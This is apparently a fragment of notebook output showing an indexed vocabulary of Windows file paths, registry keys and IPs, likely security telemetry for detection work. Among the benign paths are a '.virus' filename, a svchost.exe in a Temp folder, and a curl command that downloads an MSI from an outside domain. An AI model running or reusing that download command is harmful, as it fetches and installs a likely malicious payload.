       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 286,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 287,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Edge Shopping\\\\*': 288,\n",
       " '92001e9cebec0f0f0ac2b7c7e04f017d.virus': 289,\n",
       " 'wlua5.1.exe': 290,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\active-directory\\\\.git': 291,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 292,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache\\\\.git': 293,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.blob\\\\.git': 294,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\353698': 295,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\Temp': 296,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local\\\\Microsoft': 297,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\AC\\\\*': 298,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 299,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\BackgroundTransferApi': 300,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\he': 301,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\*': 302,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\tr\\\\*': 303,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\*': 304,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\*': 305,\n",
       " 'C:\\\\Users\\\\david67': 306,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\AC\\\\INetCache': 307,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 308,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sv': 309,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\Pictures\\\\Saved Pictures\\\\.git': 310,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState': 311,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\*': 312,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\zh_TW\\\\.git': 313,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\*': 314,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC': 315,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\it': 316,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\J15GVKBA': 317,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\\C:\\\\Users\\\\jensenderek\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe': 318,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\SystemAppData\\\\*': 319,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-RS': 320,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 321,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\*': 322,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\be\\\\*': 323,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 324,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 325,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\zh_TW': 326,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\LocalCache\\\\*': 327,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AppData\\\\*': 328,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\CEF-Log-Analytics-Agent\\\\scripts\\\\*': 329,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\zh_HK\\\\*': 330,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 331,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 332,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\*': 333,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\CustomDestinations': 334,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCache': 335,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 336,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL\\\\*': 337,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ShellFeeds\\\\.git': 338,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\events': 339,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\RoamingState': 340,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ig-NG\\\\*': 341,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\.git': 342,\n",
       " '152.199.5.13': 343,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\*': 344,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\SystemAppData': 345,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\LocalState': 346,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default': 347,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\*': 348,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\LocalCache': 349,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 350,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 351,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 352,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 353,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\sv\\\\*': 354,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 355,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\index-dir\\\\*': 356,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\se': 357,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\es': 358,\n",
       " 'smona132175062315590385642': 359,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetCookies': 360,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data\\\\LevelDB\\\\*': 361,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\*': 362,\n",
       " 'C:\\\\Windows\\\\System32\\\\Curl.exe -k http://enlacelaboral.com/3cKldxdt/AhIaKCwxEn8qPXsYQn12eWR6endleGV9fQ== -o 27bf5ef8.msi': 363,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\AC\\\\*': 364,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CallingShellApp_cw5n1h2txyewy\\\\AppData\\\\.git': 365,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\da\\\\*': 366,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 367,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-TT\\\\.git': 368,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\LocalState\\\\.git': 369,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\2ZK7K4M1\\\\*': 370,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_metadata\\\\.git': 371,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 372,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 373,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ca\\\\.git': 374,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\nl': 375,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-AU\\\\*': 376,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\.git': 377,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 378,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 379,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe': 380,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 381,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Mozilla\\\\*': 382,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\fr_CA\\\\.git': 383,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\Desktop\\\\.git': 384,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\.git': 385,\n",
       " 'C:\\\\Users\\\\benjamin99\\\\Downloads\\\\GoToAssist.exe:Zone.Identifier': 386,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy': 387,\n",
       " 'C:\\\\Users\\\\bmoore\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\syslog': 388,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ms\\\\.git': 389,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 390,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\Personal\\\\FeedbackHub': 391,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Safety\\\\edge\\\\local\\\\local': 392,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 393,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{5CE4A5E9-E4EB-479D-B89F-130C02886155}\\\\LocalizedName': 394,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 395,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\Settings\\\\*': 396,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\94.0.992.47\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 397,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\def\\\\Session Storage\\\\.git': 398,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 399,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState\\\\*': 400,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\*': 401,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalCache': 402,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 403,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\TempState\\\\.git': 404,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\LocalState': 405,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\AC\\\\.git': 406,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\.git': 407,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\*': 408,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fr\\\\*': 409,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sv-SE': 410,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 411,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\LocalLow\\\\Microsoft\\\\Internet Explorer\\\\EdpDomStore\\\\.git': 412,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 413,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\LocalState\\\\*': 414,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe': 415,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalState\\\\Logs\\\\.git': 416,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\Favicons\\\\*': 417,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\pnacl\\\\*': 418,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 419,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 420,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory': 421,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\RoamingState': 422,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AppData': 423,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}': 424,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-QA\\\\.git': 425,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\bg': 426,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationGuidePredictionModels\\\\OPTIMIZATION_TARGET_LANGUAGE_DETECTION_2203162232\\\\*': 427,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL': 428,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338388': 429,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\bg\\\\*': 430,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\.git': 431,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\314559\\\\*': 432,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\*': 433,\n",
       " '23.1.236.18': 434,\n",
       " 'C:\\\\Users\\\\angela76\\\\Desktop\\\\Sysmon\\\\.git': 435,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-PE\\\\*': 436,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 437,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 438,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-HN\\\\.git': 439,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\es\\\\.git': 440,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\AC\\\\*': 441,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache': 442,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetHistory': 443,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe': 444,\n",
